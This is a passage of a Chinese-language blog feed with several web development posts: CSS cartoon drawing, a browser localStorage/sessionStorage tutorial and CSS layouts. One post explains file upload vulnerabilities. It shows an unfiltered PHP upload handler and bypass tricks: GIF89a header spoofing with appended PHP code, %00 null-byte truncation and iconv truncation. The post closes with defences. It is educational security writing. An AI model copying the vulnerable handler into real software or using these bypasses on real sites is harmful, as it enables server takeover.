class="attribute">border-bottom</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-right</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">63px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(75deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563112075313.png" alt="1563112075313"></p><p>这里需要注意的</p><p>1.可以看到裤子两边有两条有弧度的曲线段，我是通过给矩形某一个角实现圆角效果，然后只设置与这个角相邻的两条边的边框样式，使用transform然后旋转一下角度就实现这个效果了。接下来把眼睛这些画好</p><p>看下效果吧</p><p><img src="/images/mini/1563113068118.png" alt="1563113068118"></p><p>这里由于我放的是图片其实这里的眼睛已经可以动了，这里采用<code>animation</code>css3的属性，它总共有6个动画</p><p><img src="/images/mini/1563113519271.png" alt="1563113519271"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> white-eye &#123;</span><br><span class="line">0%,</span><br><span class="line">20%,</span><br><span class="line">50%,</span><br><span class="line">70%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(0px);</span><br><span class="line">&#125;</span><br><span class="line">30%,</span><br><span class="line">40% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(3px, 4px, 0);</span><br><span class="line">&#125;</span><br><span class="line">80%,</span><br><span class="line">90% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(-15px, 4px, 0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.eyes</span> <span class="selector-class">.left_eye</span> <span class="selector-class">.left_black_eye</span> <span class="selector-class">.left_white</span>,</span><br><span class="line"><span class="selector-class">.eyes</span> <span class="selector-class">.right_eye</span> <span class="selector-class">.right_black_eye</span> <span class="selector-class">.right_white</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">7px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">17px</span>;</span><br><span class="line"><span class="attribute">animation</span>: white-eye <span class="number">5s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是嘴巴手都画好</p><p><img src="/images/mini/1563114400081.png" alt="1563114400081"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hands</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span>,</span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.right-hand</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(249, 217, 70);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">220px</span>;</span><br><span class="line"><span class="attribute">left</span>: -<span class="number">23px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(40deg);</span><br><span class="line"><span class="attribute">animation</span>: right-hand .<span class="number">8s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> right-hand &#123;</span><br><span class="line">0%,</span><br><span class="line">50%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(40deg);</span><br><span class="line">&#125;</span><br><span class="line">30% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(37deg) <span class="built_in">translateX</span>(1px);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">182px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">220px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-40deg);</span><br><span class="line"><span class="attribute">animation</span>: left-hand .<span class="number">8s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> left-hand &#123;</span><br><span class="line">0%,</span><br><span class="line">50%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-40deg);</span><br><span class="line">&#125;</span><br><span class="line">80% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-37deg) <span class="built_in">translateX</span>(-1px);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span><span class="selector-pseudo">:after</span>,</span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.right-hand</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">13px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(90deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">53px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-90deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放一下最后的成品图吧</p><p><img src="/images/mini/1563115262916.png" alt="1563115262916"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这里是为了巩固这几天学的知识所以决定写这个小案例，这里简单说一下&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="css" scheme="http://onekingcc.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>关于本地存储</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"/>
    <id>http://onekingcc.github.io/2020/06/03/本地存储/</id>
    <published>2020-06-03T14:28:13.090Z</published>
    <updated>2020-11-14T06:21:46.512Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h4><p>​    1. 数据存储在用户浏览器中</p><p>​    2. 设置，读取方便，页面刷新不会丢失数据</p><p>​    3. 容量较大，<code>sessionStorage</code>约5M，<code>localStorage</code>约20M</p><p>​    4. 只能存储在字符串可以将对象 JSON.stringify()编码后存储</p><h4 id="window-sessionStorage"><a href="#window-sessionStorage" class="headerlink" title="window.sessionStorage"></a>window.sessionStorage</h4><ol><li><p>生命周期为关闭浏览器</p></li><li><p>在同一个窗口下数据可以共享</p></li><li><p>以键值对的方式存储使用</p><h5 id="存储数据："><a href="#存储数据：" class="headerlink" title="存储数据："></a>存储数据：</h5><p><code>sessionStorage.setItem</code>(key,value)</p><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p><code>sessionStorage.getItem</code>(key)</p><h5 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h5><p><code>sessionStorage.removeItem</code>(key)</p><h5 id="删除所有的数据"><a href="#删除所有的数据" class="headerlink" title="删除所有的数据"></a>删除所有的数据</h5><p><code>sessionStorage.clear()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"set"</span>&gt;存储数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="get"&gt;获取数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"remove"</span>&gt;删除数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="del"&gt;清除所有数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ipt = <span class="built_in">document</span>.querySelector(<span class="string">'input'</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">set</span> = document.querySelector('.<span class="keyword">set</span>');</span><br><span class="line">        var <span class="keyword">get</span> = document.querySelector('.<span class="keyword">get</span>');</span><br><span class="line">        var re = document.querySelector('.remove');</span><br><span class="line">        var del = document.querySelector('.del');</span><br><span class="line">        <span class="keyword">set</span>.addEventListener('click', function () &#123;</span><br><span class="line">            <span class="comment">//当点击之后就把输入框里面的值存储起来</span></span><br><span class="line">            <span class="keyword">var</span> val = ipt.value;</span><br><span class="line">            sessionStorage.setItem(<span class="string">'onekingcc'</span>,val);</span><br><span class="line">            sessionStorage.setItem(<span class="string">'ni'</span>,val);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="keyword">get</span>.addEventListener('click',function() &#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            <span class="built_in">console</span>.log( sessionStorage.getItem(<span class="string">'onekingcc'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 移除数据</span></span><br><span class="line">        re.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            sessionStorage.removeItem(<span class="string">'onekingcc'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//删除所有数据</span></span><br><span class="line">        del.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            sessionStorage.clear();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="window-localStorage"><a href="#window-localStorage" class="headerlink" title="window.localStorage"></a>window.localStorage</h4><ol><li><p>生命周期永久生效除非手动删除，就算关闭页面也会存在</p></li><li><p>同浏览器不同页面也可相互调用(多窗口共享)</p></li><li><p>以键值对存储</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"set"</span>&gt;存储数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="get"&gt;获取数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"remove"</span>&gt;删除数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="del"&gt;清除所有数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ipt = <span class="built_in">document</span>.querySelector(<span class="string">'input'</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">set</span> = document.querySelector('.<span class="keyword">set</span>');</span><br><span class="line">        var <span class="keyword">get</span> = document.querySelector('.<span class="keyword">get</span>');</span><br><span class="line">        var re = document.querySelector('.remove');</span><br><span class="line">        var del = document.querySelector('.del');</span><br><span class="line">        <span class="keyword">set</span>.addEventListener('click', function () &#123;</span><br><span class="line">            <span class="comment">//当点击之后就把输入框里面的值存储起来</span></span><br><span class="line">            <span class="keyword">var</span> val = ipt.value;</span><br><span class="line">            localStorage.setItem(<span class="string">'onekingcc'</span>,val);</span><br><span class="line">            localStorage.setItem(<span class="string">'ni'</span>,val);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="keyword">get</span>.addEventListener('click',function() &#123;</span><br><span class="line">            <span class="comment">// localStorage.getItem('onekingcc')</span></span><br><span class="line">            <span class="built_in">console</span>.log( localStorage.getItem(<span class="string">'onekingcc'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 移除数据</span></span><br><span class="line">        re.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            localStorage.removeItem(<span class="string">'onekingcc'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//删除所有数据</span></span><br><span class="line">        del.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            localStorage.clear();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="记住密码案例"><a href="#记住密码案例" class="headerlink" title="记住密码案例"></a>记住密码案例</h4><ol><li><p>把数据存储起来使用本地存储关闭页面可以显示用户名，所以用到localStrage</p></li><li><p>打开页面首先判断是否有这个用户名，如果有就在表单里面显示用户名，并且勾选复选框</p></li><li><p>当复选框发生改变时，使用change事件</p></li><li><p>如果勾选，就存储，否则就移除</p></li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span>&gt;记住用户&lt;input type=<span class="string">"checkbox"</span> name = <span class="string">""</span>id=<span class="string">"remeber"</span>&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="built_in">document</span>.querySelector(<span class="string">"#username"</span>);</span><br><span class="line">    <span class="keyword">var</span> checkbox = <span class="built_in">document</span>.querySelector(<span class="string">"#remeber"</span>);</span><br><span class="line">    <span class="keyword">if</span>(localStorage.getItem(<span class="string">'username'</span>))&#123;</span><br><span class="line">        username.value = localStorage.getItem(<span class="string">'username'</span>);</span><br><span class="line">        remeber.checkbox = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    remeber.addEventListener(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.checked)&#123;</span><br><span class="line">            localStorage.setItem(<span class="string">'username'</span>,username.value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            localStorage.removeItem(<span class="string">'username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;本地存储&quot;&gt;&lt;a href=&quot;#本地存储&quot; class=&quot;headerlink&quot; title=&quot;本地存储&quot;&gt;&lt;/a&gt;本地存储&lt;/h4&gt;&lt;p&gt;​    1. 数据存储在用户浏览器中&lt;/p&gt;
&lt;p&gt;​    2. 设置，读取方便，页面刷新不会丢失数据&lt;/p&gt;
&lt;p&gt;​
      
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://onekingcc.github.io/2020/06/03/文件上传漏洞/</id>
    <published>2020-06-03T14:28:13.060Z</published>
    <updated>2019-09-15T09:15:04.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>前不久面试的时候面试官问了我一些文件上传，感觉答的不是很好，然后又去重新了解了一下，看了<strong>雨师傅</strong>写的文件上传，真的写的很好，这里我只写下一些基础的东西。 </p><p>在日常的业务场景中文件上传这个功能出现在很多的地方，比如文件上传，图片上传，但是在处理文件上传的时候没有进行过滤，这里的过滤是指的是没有进行任何文件的过滤然后就进行上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_FILES[<span class="string">'file'</span>];</span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>],$file[<span class="string">'name'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用move_uploaded_file()直接把临时上传的文件copy到新的文件中，就会导致任意文件上传，</p><h3 id="常见的绕过技巧"><a href="#常见的绕过技巧" class="headerlink" title="常见的绕过技巧"></a>常见的绕过技巧</h3><h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h4><p>比如<code>getimagesize()</code>如果上传的是一个非图片的文件会被提示不是图片文件，但是如果在文件头里面添加“GIF89a”后上传则验证通过,返回图片的尺寸数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r (getimagesize(<span class="string">'2.gif'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/upload/1568355701285.png" alt="1568355701285"></p><p><img src="/images/upload/1568355859925.png" alt="1568355859925"></p><p>这种绕过的话就直接上传图片的时候在图片后面加上想要执行的php代码就可以绕过。</p><h4 id="00绕过"><a href="#00绕过" class="headerlink" title="00绕过"></a>00绕过</h4><p>00截断即是NULL会被gpc和addslashes函数过滤，要想使用00截断就需要没开起gpc以及没被addslashes过滤，之所以能够使用00截断使因为php是基于C语言开发的%00URL解码后就是C语言的/0，这里新建00.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"2.txt/000.jpg"</span>;</span><br></pre></td></tr></table></figure><p>测试文件2.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php5.2.x版本解析00.php时会将2.txt/000.jpg解析为2.txt正常执行phpinfo代码</p><p><img src="/images/upload/1568517309671.png" alt="1568517309671"></p><h4 id="字符编码截断"><a href="#字符编码截断" class="headerlink" title="字符编码截断"></a>字符编码截断</h4><p>iconv()函数用来做字符编码转化，这个函数特性当它遇到不能处理的字符串时，后面将不进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $test = <span class="string">'one'</span>.chr(<span class="number">200</span>).<span class="string">'onekingcc'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> iconv(<span class="string">"UTF-8"</span>,<span class="string">"gbk"</span>,$test);</span><br><span class="line"><span class="comment">//$test = @iconv("UTF-8","gbk",$test);</span></span><br><span class="line">    <span class="comment">//var_dump($test);</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/upload/1568533068549.png" alt="1568533068549"></p><p>测试发现在php版本为5.4.及以上的版本转化字符的时候会返回false</p><p><img src="/images/upload/1568533624373.png" alt="1568533624373"></p><p>这里当使用iconv()函数转化时候从chr(130)之后就没有输出会被截断</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li>客户端检测，使用 js 对上传图片检测，包括文件大小、文件扩展名、文件类型等</li><li>服务端检测，对文件大小、文件路径、文件扩展名、文件类型、文件内容检测、对文件重命名等</li><li>其他限制，如服务器端上传目录设置不可执行权限</li><li>检查网站有没有文件解析漏洞和文件包含漏洞</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;p&gt;前不久面试的时候面试官问了我一些文件上传，感觉答的不是很好，然后又去重新了解了一下，看了&lt;strong&gt;雨师
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>页面中的常见布局</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E5%B7%A9%E5%9B%BA%E9%A1%B5%E9%9D%A2%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%B8%83%E5%B1%80/"/>
    <id>http://onekingcc.github.io/2020/06/03/巩固页面中的常见布局/</id>
    <published>2020-06-03T14:28:13.040Z</published>
    <updated>2019-07-11T15:02:38.913Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下便学习一下之前没有学到的然后记录下来，然后有了这篇文章。<a id="more"></a></p><h3 id="单列布局"><a href="#单列布局" class="headerlink" title="单列布局"></a>单列布局</h3><p>这种布局的特点就是头部，主体，底部，等宽，实现这种的单列布局的思路：就是首先有个大的div，设置宽度然后将头部主体和底部进行统一设置，容器里的子块只需要设置一下高度即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        .conter&#123;</span><br><span class="line">            max-width: 960px;   /*设置最大宽度为960像素*/</span><br><span class="line">            margin: 0 auto;     /*内部的元素水平居中*/</span><br><span class="line">        &#125;</span><br><span class="line">        .head&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background: blue;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 500px;</span><br><span class="line">            background: pink;</span><br><span class="line">        &#125;</span><br><span class="line">        .footer&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background:olive;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span>头部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span 